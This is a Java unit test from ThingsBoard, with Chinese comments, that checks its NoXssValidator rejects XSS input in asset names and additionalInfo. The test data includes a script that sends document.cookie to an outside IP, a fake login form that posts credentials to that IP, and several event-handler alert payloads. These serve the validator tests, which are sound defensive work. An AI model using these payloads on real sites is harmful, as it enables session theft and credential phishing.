/**
 * Copyright © 2016-2024 The Thingsboard Authors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.thingsboard.server.dao.service;

import com.fasterxml.jackson.databind.node.TextNode;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.thingsboard.common.util.JacksonUtil;
import org.thingsboard.server.common.data.asset.Asset;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * 中文说明：
 * 1. `NoXssValidatorTest` 是 ThingsBoard DAO 中验证 `NoXssValidator` 相关行为的测试类型。
 * 2. 它通过测试夹具构造输入，并执行被测类型的关键入口。
 * 3. 测试方法用准备数据、执行步骤和预期结果描述需要保持的行为。
 * 4. 它直接协作于被测类型、测试框架和必要的模拟依赖。
 * 5. 独立测试类型用于固定当前行为，防止后续修改造成回归。
 * 6. 阅读时重点关注测试方法名称中的场景、准备数据和最终断言。
 */
public class NoXssValidatorTest {

    /**
     * 功能：验证 `givenEntityWithMaliciousPropertyValue_thenReturnValidationError` 描述的测试场景。
     * 参数：
     * - `maliciousString`：`maliciousString` 参数。
     * 返回：无。
     */
    @ParameterizedTest
    @ValueSource(strings = {
            "aboba<a href='a' onmouseover=alert(1337) style='font-size:500px'>666",
            "9090<body onload=alert('xsssss')>90909",
            "qwerty<script>new Image().src=\"http://192.168.149.128/bogus.php?output=\"+document.cookie;</script>yyy",
            "bambam<script>alert(document.cookie)</script>",
            "<p><a href=\"http://htmlbook.ru/example/knob.html\">Link!!!</a></p>1221",
            "<h3>Please log in to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Log in\"></br>",
            "   <img src= \"http://site.com/\"  >  ",
            "123 <input type=text value=a onfocus=alert(1337) AUTOFOCUS>bebe"
    })
    public void givenEntityWithMaliciousPropertyValue_thenReturnValidationError(String maliciousString) {
        Asset invalidAsset = new Asset();
        invalidAsset.setName(maliciousString);

        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(invalidAsset);
        }).hasMessageContaining("is malformed");
    }

    /**
     * 功能：验证 `givenEntityWithMaliciousValueInAdditionalInfo_thenReturnValidationError` 描述的测试场景。
     * 参数：无。
     * 返回：无。
     */
    @Test
    public void givenEntityWithMaliciousValueInAdditionalInfo_thenReturnValidationError() {
        Asset invalidAsset = new Asset();
        String maliciousValue = "qwerty<script>alert(document.cookie)</script>qwerty";
        invalidAsset.setAdditionalInfo(JacksonUtil.newObjectNode()
                .set("description", new TextNode(maliciousValue)));

        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(invalidAsset);
        }).hasMessageContaining("is malformed");
    }

}
